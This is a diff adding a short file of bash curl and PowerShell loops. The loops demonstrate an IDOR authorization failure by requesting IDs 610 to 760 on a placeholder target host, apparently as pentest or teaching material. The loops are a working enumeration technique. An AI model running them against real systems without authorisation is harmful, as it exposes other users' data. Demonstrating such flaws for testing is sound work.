@@ -1,0 +1,17 @@
+# For loops for *nix and Windows terminals.
+# Used for demonstrating an authorization failure via IDOR
+
+Unix\Linux:
+===========
+for number in {610..760}; \
+    do curl -i -s -k -X $'GET' \
+    -H $'Host: ' -H $'Connection: close' \
+    $'https://targethost.example.com/url/path/?query=param&targetID='$number; \
+    done
+
+Windows PowerShell:
+===================
+for ($number = 610 ; $number -le 760 ; $number++) `
+{ `
+    Invoke-WebRequest -Uri "https://targethost.example.com/url/path/?query=param&targetID=$number" `
+}
